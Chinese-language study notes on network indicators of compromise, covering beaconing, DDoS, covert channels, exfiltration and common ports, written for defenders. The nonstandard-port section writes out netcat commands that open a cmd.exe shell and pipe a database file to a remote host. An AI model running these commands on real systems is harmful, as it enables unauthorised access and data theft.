# 網路入侵指標分析

- **Network Indicators of Compromise（網路入侵指標）**：用於檢測和分析網路中可能存在的惡意活動跡象
  - 主要討論如何分析潛在惡意活動的指標

## 網路入侵指標類型

- **Network-based IOCs（網路型入侵指標）**：存在於網路流量中的可疑活動跡象
  - 與 Host-based IOCs（主機型）和 Application-based IOCs（應用程式型）不同

- **Traffic Spikes（流量突增）**：網路流量異常增加的現象
  - 可能表示資料外洩或惡意活動正在進行

- **Beaconing（信標通訊）**：惡意軟體定期向指令控制伺服器發送通訊的行為
  - 通常表現為固定時間間隔的網路連線模式

- **Irregular Peer-to-peer Communication Channels（不規則的點對點通訊通道）**：
  - 異常的點對點連線可能表示橫向移動或命令控制活動

- **Rogue Devices（惡意/未授權裝置）**：未經授權連接到網路的裝置
  - 可能被用於執行網路攻擊或資料竊取

- **Scans and Sweeps（掃描與掃瞄）**：偵測網路上目標的嘗試
  - 通常是攻擊者用來發現潛在漏洞或系統的前期活動

- **Non-standard Port Usage（非標準埠使用）**：應用程式使用不尋常或非預設的埠
  - 可能表示攻擊者正試圖繞過安全控制

## 其他重要概念

- **Common TCP and UDP Ports（常見的 TCP 和 UDP 埠）**：
  - 了解標準埠使用有助於識別非標準埠的使用情況
  - 是判斷異常網路行為的基礎

- **Data Exfiltration Techniques（資料外洩技術）**：攻擊者用來從受害組織中竊取資料的方法
  - 可能利用各種通訊協定或加密方式隱藏活動

- **Covert Channels（隱蔽通道）**：使用意料之外的方式來傳輸資料的通訊路徑
  - 設計用來避開傳統的網路監控和防禦機制

# 常見網路 IOC

- **Port Scanning and Sweeps**（連接埠掃描與掃瞄）：可能是即將發生攻擊的前兆指標
  - 攻擊者通常在實際攻擊前進行偵查活動

- **Non-standard Port Usage**（非標準連接埠使用）：服務運行在不尋常的連接埠上
  - 例如：SSL 加密流量使用非 443 連接埠
  - 如果特定攻擊者或惡意軟體總是使用相同的非標準連接埠，這可作為重要的 IOC

- **Covert Channel**（隱蔽通道）：通過非常規方法傳輸資料
  - 例如：透過 ping 封包傳輸資料（ping 封包通常不應該包含額外資料）
  - 可能表示資料外洩、信標通訊或命令與控制（C2）活動

- **Rogue Devices**（惡意裝置）：網路中出現未經授權的設備
  - 例如：新的無線存取點、無線網路或交換器
  - 可能是內部威脅的指標，無論是惡意的還是為了方便而設置的

- **Insider Threat**（內部威脅）：來自組織內部人員的安全風險
  - 可能是有意的惡意行為或無意的便利性設置
  - 都會對網路安全帶來威脅

# 流量峰值與分散式拒絕服務攻擊

- **Traffic Spike（流量尖峰）**：相對於基準值的連接請求急劇增加
  - 流量峰值並非總是惡意的，可能是正常活動（如系統備份）造成
  - 需要進一步分析來確定是否為威脅

- **DDoS（Distributed Denial of Service，分散式阻斷服務攻擊）**：利用多個受感染主機（通常是殭屍網路中的殭屍電腦）壓倒目標服務
  - 使用大量請求或回應流量消耗目標資源（網路、處理器或記憶體）
  - 現代DDoS攻擊可透過付費服務取得，無需技術知識即可發動
  - 攻擊流量通常模仿合法流量，難以過濾

- **DDoS攻擊指標**：
  - 來自網際網路主機的大量意外流量激增
  - 負載平衡器中過多的連線等待
  - 大量HTTP 503錯誤（服務不可用）日誌事件
  - 從您的網路發出大量出站流量可能表明您的主機已被控制用於攻擊他人

- **DDoS流量測量方式**：
  - 頻寬消耗：以每秒兆位元、吉位元或太位元計算
  - 鏈路使用率百分比：例如使用80%的1Gbps連線

- **DRDoS（Distributed Reflection Denial of Service，分散式反射阻斷服務攻擊）**：網路攻擊透過放大因子增加發送到受害者的頻寬
  - 攻擊者偽造受害者IP地址並嘗試與多個伺服器建立連接
  - 所有伺服器回應被引導至受害者
  - 常見放大協議：ICMP、DNS、NTP（Network Time Protocol特別有效，可產生600倍放大）

- **Slashdot Effect（爆紅效應）**：網站因某個知名媒介（例如知名網站）介紹或導向而突然流量激增導致崩潰
  - 當小型網站因在社交媒體（如Reddit、Twitter）上曝光而迅速變得流行時發生
  - 例如：華爾街日報在報導聯合航空故障時因流量激增而崩潰
  - 與DDoS不同，這是合法使用者造成的流量激增

- **DDoS攻擊緩解策略**：
  - 進行實時日誌分析以識別可疑流量模式並將其重定向到黑洞或沉洞
  - 使用地理位置和IP信譽數據重定向或忽略可疑流量
  - 通過減少受影響伺服器的超時時間來積極關閉較慢的連接
  - 使用緩存和後端基礎設施將處理卸載到其他伺服器
  - 利用企業DDoS保護服務（如CloudFlare或Alchemy）

- **防禦目標**：挺過DDoS攻擊
  - 大多數DDoS攻擊短暫（通常僅持續幾分鐘到幾十分鐘）
  - 實施緩解策略，儘量為正常用戶提供服務，直到攻擊停止

# 信標通訊（Beaconing）

- **Beaconing**（信標通訊）：一種網路節點用來通告自己存在並與其他節點建立連結的方法。
  - 當電腦被惡意軟體感染後，會透過信標機制向命令與控制（C2）伺服器回報自己的存在
  - 信標通訊的目的是讓受害機器向C2伺服器發送訊息，表示「我在這裡，現在是你殭屍網路的一部分」

- **合法信標應用**：
  - 無線存取點的信標管理框架（beacon management frame）
  - NTP伺服器
  - 自動更新和修補系統
  - 叢集服務

- **惡意信標特徵**：
  - 通常會以簡單的ping或心跳（heartbeat）形式傳送
  - 目的是確認機器人（bot）仍然活著並可接收指令
  - 可以定期發生或根據設定在不同時間發生

## 信標逃避技術

- **DGA**（Domain Generation Algorithms，網域產生演算法）：攻擊者透過演算法動態生成網域名稱，使防禦者難以阻擋固定目標。

- **Fast Flux DNS**：快速改變DNS名稱和IP地址，使防禦者難以追蹤或阻擋。

- **Jitter**（抖動）：攻擊者使用隨機延遲來干擾基於規律連接嘗試間隔的檢測指標。
  - 例如，原本固定在3:15 AM連線，現在可能在3:00、3:15或3:45不規則連線
  - 即使只有幾毫秒或幾秒的延遲差異，也足以混淆某些檢測器

- **Sparse Delivery**（稀疏傳輸）：
  - 降低封包大小，讓惡意通訊隱藏在其他網路流量的雜訊中
  - 在大量數據傳輸的網路中，少量的信標封包很難被察覺

## 信標檢測方法

- 捕獲關於所有正在建立或嘗試連線的會話的元數據
- 透過分析將這些資料關聯到信標活動
- 了解網路中的正常、授權行為是識別惡意信標的關鍵

## C2通訊管道

- **IRC**（Internet Relay Chat，網際網路中繼聊天）：
  - 一種群組通訊協定，網路被分割成獨立的頻道，供客戶端互相聊天
  - 曾是90年代和2000年代初期流行的C2管道
  - 大多數組織現在沒有IRC的合法用途，通常會阻擋此服務

- **HTTP和HTTPS**：
  - 每個企業都需要網頁連線，因此無法完全阻擋
  - 最佳緩解方法是在網路邊緣使用攔截代理（intercepting proxy）
  - 也稱為「中斷與檢查」（break and inspect）技術

- **DNS**（Domain Name System，網域名稱系統）：
  - 大多數私人組織網路中的DNS流量未被檢查或過濾
  - 允許攻擊者在請求或回應查詢中發送命令
  - 可疑跡象：
    - 同一查詢重複多次
    - 查詢/回應比正常情況長且複雜
  - 攻擊者可將控制訊息分割成多個查詢塊以避免檢測

- **社交媒體網站**：
  - Facebook、Twitter、LinkedIn等平台被用於C2操作
  - 讓攻擊者「就地取材」（live off the land），不需安裝特殊工具
  - 實例：
    - 一個殭屍網路利用LinkedIn的職位變更作為攻擊信號
    - 另一個殭屍網路使用Twitter的特定主題標籤作為命令傳遞方式

- **雲服務**：
  - 攻擊者可利用虛擬機器或應用程式引擎發送C2訊息
  - 例如：使用Google App Engine或AWS Lambda
  - 好處：不需自建伺服器，且可利用雲服務的可靠性和可擴展性

- **媒體和文檔檔案中的元數據**：
  - 元數據（Metadata）是描述其他數據的資料集
  - MP3、PNG、JPEG等檔案中的元數據可包含C2訊息
  - 大多數檢測系統不會檢查檔案元數據，因此容易繞過防禦

# 不尋常的點對點通信（Irregular Peer-to-peer Communications）

- **Irregular peer-to-peer communications**（不尋常的點對點通信）：網路中主機之間建立未經授權的連接或數據傳輸的攻擊指標
  - 大多數網路中，主要用戶流量通常是從客戶端到服務器
  - 大量點對點通信可能是入侵的指標，需要進一步調查

- **SMB（Server Message Block）**：Windows網路中用於文件和打印機共享的協議
  - 常見於Windows網路中提供文件和打印機共享服務
  - 可區分為正常授權使用和異常使用（入侵指標）

## 正常的SMB通信案例

- **正常的SMB通信**：
  - 從服務器（10.1.0.1）到客戶端（10.1.0.133）
  - 使用SPOOLSS協議（打印機池協議）
  - GetPrinter響應
  - 傳輸Windows驅動程序文件（有MZ魔術簽名，表示Windows可執行文件）
  - 這是客戶端連接到打印服務器時正常的驅動程序下載行為

## 可疑的點對點通信案例

- **可疑的點對點通信**：
  - 發生在兩個客戶端之間（10.1.0.249和10.1.0.133）
  - 在組織網路中，客戶端間直接通信通常是不必要的
  - 包含NetPathCanonicalization請求（與Conficker蠕蟲相關）
  - 建立TCP三次握手
  - 傳輸二進制文件（含MZ魔術簽名）

- **Conficker蠕蟲**：
  - 2008年利用NetPathCanonicalization函數作為攻擊向量
  - 相關漏洞由Microsoft 08-067修補
  - 在發現可疑通信時，可以提取二進制文件進行逆向分析，確定是否為惡意軟件

## 本地網路上的不尋常點對點通信

- **ARP欺騙/毒化（ARP Spoofing/Poisoning）**：
  - 攻擊者將IP地址重定向到非預期的MAC地址目標
  - 可導致不尋常的點對點通信
  - 檢測方法：
    - 使用入侵檢測系統（IDS）識別可疑流量模式
    - ARP毒化會產生比正常情況多得多的ARP流量
    - 檢查本地機器的ARP緩存（使用`arp -a`命令）
    - 將MAC地址與已知服務器機器的值進行比較

# 惡意裝置 (Rogue Devices)

- **Rogue Devices**（惡意裝置）：未經授權連接到企業或私人網路的裝置或服務，可能允許未授權人員連接到該網路。
  - 包括無線接入點 (WAP)、DHCP 伺服器、DNS 伺服器等。
  - 甚至包括 USB 隨身碟等未經授權連接到伺服器的裝置。

- **Rogue System Detection**（惡意系統檢測）：識別和移除網路上不應該存在的機器的過程。

## 惡意裝置類型

- **Network Taps**（網路監聽器）：連接到網路線路上記錄經過該網段的封包的實體裝置。
  - 作為安全分析師，我們希望使用受控的網路監聽器來收集資訊。
  - 但不希望有受攻擊者控制的惡意網路監聽器。

- **Wireless Access Points (WAPs)**（無線接入點）：連接到網路並將實體網路延伸到無線頻譜中的裝置。
  - 惡意接入點可能連接到您的網路，讓攻擊者從外部連接進入。
  - 攻擊者也可能設立假冒（Evil Twin）接入點，看起來像您網路的一部分。

- **Servers**（伺服器）：攻擊者可能設置蜜罐伺服器來收集網路憑證或其他資料。
  - 可能利用 ARP 欺騙或破壞名稱解析來將流量導向他們的伺服器。

- **Wired and Wireless Clients**（有線和無線客戶端）：如個人筆電連接到組織網路。
  - 這些未受控裝置可能帶有網路攝影機、麥克風和惡意軟體。
  - 即使是授權客戶端，若以未授權方式使用（如進行 SSH 掃描），也會變成惡意裝置。

- **Software**（軟體）：未經授權安裝的軟體也可視為惡意裝置。
  - 可能包含惡意 DHCP/DNS 伺服器、惡意軟體或隱蔽監控軟體。

- **Virtual Machines**（虛擬機器）：在高度虛擬化環境中，攻擊者可能建立虛擬機器來部署惡意伺服器。
  - 相比實體設備，虛擬機器僅為軟體代碼，更難被發現。

- **Smart Appliances**（智慧型裝置）：如印表機、網路攝影機、智慧電視等連網裝置。
  - 這些裝置通常運行 Linux 系統但缺乏定期更新和修補。
  - 可能成為攻擊者利用的漏洞點。

## 惡意裝置檢測方法

- **Visual Inspection**（實體檢查）：檢查端口和交換器。
  - 確保攻擊者沒有安裝額外設備或帶有假資產標籤的仿冒設備。
  - 定期（每月或每季）進行設備清點。

- **Network Mapping and Host Discovery**（網路映射和主機發現）：
  - 使用列舉掃描器通過橫幅抓取和指紋識別來識別網路中的主機。
  - 建立基準線，定期比對以發現未經變更控制流程的新伺服器。

- **Wireless Monitoring**（無線監控）：
  - 又稱無線嗅探和發現，用於找出辦公區域內未知或無法識別的服務集識別符（SSID）。

- **Packet Sniffing and Traffic Flows**（封包嗅探和流量分析）：
  - 識別網路上未授權協議或異常點對點通訊流量。
  - 例如，若網路中不應有 Web 伺服器但卻有 80 端口活動，可能是惡意 Web 伺服器。

- **NAC and Intrusion Detection**（網路存取控制和入侵檢測）：
  - 安全套件和設備結合自動網路掃描與防禦和修復功能。
  - NAC 可使用用戶名密碼或數位憑證控制網路存取。
  - 入侵檢測系統可掃描網路並標記新發現的未知裝置。

# 掃描技術

- **Port Scan**（連接埠掃描）：使用軟體工具來枚舉目標系統上 TCP 和 UDP 連接埠的狀態
  - 最常用的掃描工具是 Nmap

- **Fingerprinting**（指紋識別）：透過分析目標對網路掃描的回應，識別作業系統或伺服器應用程式的類型和版本
  - 例如：通過掃描可確認目標開放了連接埠 80，並判斷是運行 Apache 還是 IIS Azure Web 伺服器
  - 還可以根據回應特徵判斷目標是運行 Windows 還是 Linux

- **Sweep**（網段掃描）：針對多個 IP 位址進行掃描，以發現哪些主機對特定連接埠的連線請求有回應
  - 例如：掃描整個網路，找出所有開放連接埠 80 的伺服器
  - 可以先廣泛掃描，然後對特定目標進行深入分析

- **Footprinting**（足跡分析）：攻擊或滲透測試前的階段，收集目標組織的資訊
  - 與指紋識別不同，足跡分析針對的是多台機器或整個組織
  - Fingerprinting 針對單一機器，Footprinting 針對多台機器

- **授權掃描**：網路掃描應只由授權人員從受限制的主機範圍內進行
  - 安全分析師通常使用特定的管理工作站進行掃描
  - 可在入侵偵測系統中設置規則，允許來自特定 IP 的掃描活動

- **入侵偵測系統**（IDS）：可以通過檢測 SYN、SYN/ACK 或 FIN 封包的數量差異來識別掃描活動
  - 例如：發送大量 SYN 封包但很少 SYN/ACK 回應，可能表示正在進行掃描

- **掃描活動的普遍性**：
  - 對於面向網際網路的資源，掃描是常見現象，不應引起恐慌
  - 掃描本身不一定意味著即將發生攻擊
  - 在攻擊發生後，可以回溯檢查歷史掃描數據，尋找相關性

# 使用非標準端口（Nonstandard Port Usage）

- **端口（Port）**：由網際網路號碼分配機構（IANA）維護的 TCP 和 UDP 端口映射，是電腦上的邏輯開口
  - 類似公寓大樓中的門牌號碼，IP 位址類似大樓地址，而端口則指定特定的服務

- **端口分類**：
  - **知名端口（Well-known Ports）**：0-1023
  - **註冊端口（Registered Ports）**：1024-49151
  - **動態端口（Dynamic Ports）**：49152-65535

- **非標準端口使用（Nonstandard Port Usage）**：當應用程式透過非其預設端口進行通訊時
  - 例如：HTTP 透過非 80 端口運行，或 DNS 透過非 53 端口運行
  - 這可能是惡意活動的指標，但也有合法用途

- **惡意軟體端口使用指標**：
  - 持續開放的動態端口（49152-65535 範圍）
  - 協議與端口不匹配（例如在網頁端口 80 上傳輸非網頁流量）

- **緩解措施**：
  - 配置防火牆僅允許白名單端口通訊
  - 維護良好的配置文件，記錄每台主機允許的服務端口
  - 設置偵測規則，檢測標準端口上的協議不匹配使用

- **遠端殼層（Shell）**：
  - **正向殼層**：攻擊者在受害主機上開啟監聽端口，從遠端連接該端口
  - **反向殼層（Reverse Shell）**：攻擊者在自己的主機上監聽，讓受害主機主動連接
    - 反向殼層能繞過入站防火牆限制，利用組織沒有正確配置出站流量過濾的漏洞

- **Netcat（nc）**：常用於建立遠端殼層的網路工具
  - 基本語法：`nc -l -p 443 -e cmd.exe`（在 443 端口上監聽並執行 cmd.exe）
  - 連接語法：`nc 10.1.0.1 443`（連接到指定 IP 的 443 端口）
  - 也可用於檔案傳輸：
    - 接收檔案：`nc -l -p 53 > database.sql`
    - 發送檔案：`type database.sql | nc 10.1.0.21 53`

- **攻擊者策略**：
  - 利用常見允許通過的端口（如 80、443、53）來隱藏惡意流量
  - 透過非標準端口使用來繞過安全監控

# 網路協定標準端口

- **Transmission Control Protocol Ports（傳輸控制協定端口）**：網路服務使用的標準化端口
  - 作為資安分析師必須熟悉常見的TCP端口，以便在檢視日誌時能立即識別服務類型

## 常見的TCP端口

- **Port 21 - FTP（檔案傳輸協定）**：用於檔案傳輸的協定
  - 運行FTP伺服器時需要開放此端口

- **Port 22 - SSH/SFTP（安全殼層/安全檔案傳輸協定）**：提供遠端命令列存取
  - SSH提供加密的遠端存取
  - SFTP是透過SSH安全通道運行的檔案傳輸協定

- **Port 23 - Telnet**：不安全的遠端管理介面
  - 已大部分被SSH取代
  - 極為脆弱，建議升級到SSH

- **Port 25 - SMTP（簡單郵件傳輸協定）**：用於發送電子郵件
  - 郵件伺服器發送郵件時使用

- **Port 53 - DNS（網域名稱系統）**：將IP轉換為名稱或名稱轉換為IP
  - 在TCP和UDP上都使用53埠
  - TCP的DNS主要用於區域傳送

- **Port 80 - HTTP（超文本傳輸協定）**：網頁流量，非加密版本
  - 用於傳輸網頁內容，但不提供加密

- **Port 110 - POP3（郵局協定第3版）**：傳統郵箱存取協定
  - 大多已被IMAP取代

- **Port 111 - RPCBIND**：在UNIX類環境中將遠端程序呼叫服務映射到端口
  - 此埠開放通常表示伺服器運行Unix、Linux或macOS

- **Port 135 - MSRPC**：在Windows環境中公告可用的遠端程序呼叫服務

- **Port 139 - NetBIOS-SSN（NetBIOS會話服務）**：支援Windows 2000之前版本的檔案共享
  - 有許多漏洞，若不需要建議關閉

- **Port 143 - IMAP（網際網路郵件存取協定）**：較新的郵件存取協定
  - 已取代大部分系統中的POP3

- **Port 443 - HTTPS（安全超文本傳輸協定）**：加密的網頁流量
  - 在客戶端與伺服器之間建立加密通道
  - 通常在瀏覽器地址列有鎖頭或綠色條標示

- **Port 445 - Microsoft-DS**：使用TCP/IP的SMB協定支援Windows檔案共享
  - 用於現代Windows網路

- **Port 993 - IMAPS（安全網際網路郵件存取協定）**：IMAP的加密版本

- **Port 995 - POP3S（安全郵局協定第3版）**：POP3的加密版本
  - 透過SSL/TLS建立加密通道

- **Port 1723 - PPTP（點對點通道協定）**：舊式VPN協定
  - 安全性較弱，目前較少使用
  - 已被IPSec等更安全的協定取代

- **Port 3306 - MySQL**：用於MySQL資料庫連接

- **Port 3389 - RDP（遠端桌面協定）**：允許視覺化登入遠端系統
  - 可控制遠端系統，傳送鍵盤和滑鼠指令
  - 在Windows環境中廣泛使用

- **Port 5900 - VNC（虛擬網路運算）**：遠端存取服務
  - 類似RDP但為開源軟體，適用於所有系統
  - 根據安全實作的不同可能使用不同端口

- **Port 8080 - HTTP-PROXY**：Web代理服務或HTTP替代埠
  - 可用於在同一伺服器上運行多個網頁伺服器
  - 也可用於運行代理伺服器

## 常見的UDP端口

- **Port 53（DNS）**：域名系統。
  - UDP 用於 DNS 查詢
  - TCP 則用於區域傳輸

- **Port 67（DHCPS）**：動態主機設定協定伺服器埠。
  - 用於 DHCP 伺服器端

- **Port 68（DHCPC）**：動態主機設定協定客戶端埠。
  - 用於 DHCP 客戶端

- **Port 69（TFTP）**：簡單檔案傳輸協定。
  - 通常用於路由器和交換器的 iOS 更新

- **Port 123（NTP）**：網路時間協定。
  - 允許裝置在網路上同步時間
  - 有助於日誌記錄協調

- **Port 135（MSRPC）**：微軟遠端程序呼叫。
  - 在 Windows 環境中公告可用的 RPC 服務
  - 在 TCP 和 UDP 都有相同功能

- **Port 137（NetBIOS Name Service）**：NetBIOS 名稱服務。
  - 支援 Windows 2000 之前版本的檔案共享
  - 類似 DNS，但用於本地網路名稱解析

- **Port 138（NetBIOS DGM）**：NetBIOS 資料包服務。
  - 支援 Windows 2000 之前版本的檔案共享
  - 用於以「發射後不管」格式傳輸大量資料

- **Port 139（NetBIOS SSN）**：NetBIOS 工作階段服務。
  - 支援 Windows 2000 之前版本的檔案共享
  - 在 TCP 和 UDP 都具有相同功能

- **Port 161（SNMP）**：簡單網路管理協定。
  - 作為代理埠傳送裝置資訊

- **Port 162（SNMP Trap）**：SNMP 陷阱訊息。
  - 管理站接收 SNMP 陷阱訊息的埠

- **Port 445（Microsoft DS）**：微軟目錄服務。
  - 支援當前 Windows 網路上的檔案共享
  - 在 TCP/IP 上運行伺服器訊息區（SMB）

- **Port 500（ISAKMP）**：網際網路安全關聯和金鑰管理協定。
  - 用於建立 IPsec 通道
  - VPN 使用 IPsec 時會用到此埠

- **Port 514（Syslog）**：系統日誌。
  - 用於 Syslog 伺服器接收日誌資訊

- **Port 520（RIP）**：路由資訊協定。
  - 較舊但仍廣泛使用的路由協定

- **Port 631（IPP）**：網際網路列印協定。
  - 用於網路連接印表機的通訊
  - Windows 和 Linux 系統廣泛使用

- **Port 1434（MS-SQL）**：微軟 SQL 伺服器。
  - 接收 Microsoft SQL Server 的查詢和請求

- **Port 1900（UPNP）**：通用隨插即用。
  - 用於遊戲主機和智慧家電的埠轉發自動設定
  - 可能造成安全漏洞，尤其在企業網路中

- **Port 4500（NAT-T-IKE）**：NAT 穿透網際網路金鑰交換。
  - 用於透過 NAT 閘道建立 IPsec 穿越

# 資料外洩防禦

- **Data Exfiltration**（資料外洩）：攻擊者將儲存在私有網路內的資料移轉到外部網路的過程
  - 本質上是竊取資訊的行為
  - 攻擊者可能進行資料外洩的目的：
    - 勒索敲詐
    - 盜用信用卡資料
    - 其他經濟利益

## 資料外洩管道類型

- **HTTP/HTTPS 傳輸**：攻擊者利用商業檔案分享服務上傳被竊資料
  - 常見工具：Dropbox、OneDrive、Google Drive 等雲端分享服務
  - 攻擊者會從受害者系統登入這些服務並上傳資料

- **HTTP 資料庫請求**：攻擊者使用 SQL 注入或類似技術從資料庫中複製記錄
  - 可觀察的 IoC（入侵指標）：
    - PHP 或其他腳本檔案的請求突然增加
    - 異常大的 HTTP 響應封包

- **DNS 管道**：利用 DNS 查詢傳輸資料出網路
  - IoC：非典型的查詢類型使用（TXT、MX、CNAME、NULL 等非標準 A 記錄）
  - 可作為隱蔽管道將資料從網路中移出

- **明顯管道（Overt Channel）**：設計用於傳送資料的正常管道被濫用
  - 包含：FTP、即時通訊、點對點傳輸、電子郵件等
  - 這些工具本來就設計用於傳輸資訊，但被攻擊者用來竊取資料

- **明確通道（Explicit Tunnel）**：使用 SSH 或 VPN 創建傳輸通道
  - IoC：非典型終端參與這些通道活動
  - 可疑指標：地理位置異常（例如來自公司無員工地區的連線）

## 資料外洩防禦注意事項

- 攻擊者可能使用不同管道進行命令控制和資料外洩
  - 即使阻斷了命令控制管道，資料外洩可能仍在進行
  - 範例：命令控制使用 DNS（端口 53），但資料透過 SSH（端口 22）外洩

- **最佳防禦措施**：對靜態和傳輸中的資料進行強加密
  - 硬碟加密可防止資料被複製後使用
  - 即使攻擊者成功下載加密檔案，沒有金鑰也無法讀取內容

# 隱密通道概念與技術

- **Covert Channels**（隱密通道）：一種通訊路徑，允許資料在不觸發入侵偵測或資料外洩防護機制的情況下從網路傳出
  - 透過安全控制未預期的方式，實現節點間資料的隱蔽傳輸
  - 與明顯通道（Overt Channels）如 FTP、點對點傳輸或即時通訊不同

## 隱密通道的類型與方法

- **防火牆繞過**：利用防火牆未實施出口過濾，透過非標準連接埠傳輸資料

- **封包標頭編碼**：將資料編碼並嵌入 TCP/IP 封包標頭中
  - 例如：將資料編碼於 ICMP 回應封包或 DNS 文字記錄中

- **資料分段**：將資料分割成多個封包，在不同時間點傳送
  - 可規避簽章分析和資料外洩防護，因這些工具通常只檢查有限時間窗口內的封包

- **十六進位混淆**：使用十六進位碼傳輸資料而非字元字串
  - 許多感測器僅尋找 ASCII 字串，而非十六進位資料

- **加密傳輸**：透過 SSL/TLS 隧道等加密格式傳輸資料
  - 除非網路邊界設有中斷檢查（break and inspect）裝置，否則難以檢測

## 隱密通道的技術分類

- **Storage Covert Channel**（儲存型隱密通道）：利用一個程序寫入儲存位置，另一個程序從該位置讀取
  - 此讀寫分離方法可能無法被作業系統核心偵測到

- **Timing Covert Channel**（計時型隱密通道）：透過一個程序改變系統資源，使其利用時間的變化向接收程序發送信號
  - 例如：利用 ping 封包的傳送時間模擬摩斯密碼

- **混合型隱密通道**：結合儲存與計時能力，更有效規避偵測

## 隱寫術（Steganography）

- **Steganography**（隱寫術）：在明顯可見的媒體中隱藏資料的技術
  - 將資料隱藏在檔案、訊息、圖像或影片中
  - 例如 LSB（最低有效位）隱藏術：將文字轉換成二進位，微調圖像像素

- **隱藏術的特性**：
  - 「明顯處的隱藏」—無需加密，僅需特定工具提取
  - 可規避資料外洩防護措施，因檔案簽章已被更改
  - 可應用於圖像、音訊、影片等多種檔案類型

## 隱密通道防護

- **防護方法**：使用進階入侵偵測系統或使用者行為分析工具
  - 這些工具雖然有效但非萬無一失
  - 防禦者與攻擊者之間持續進行攻防對抗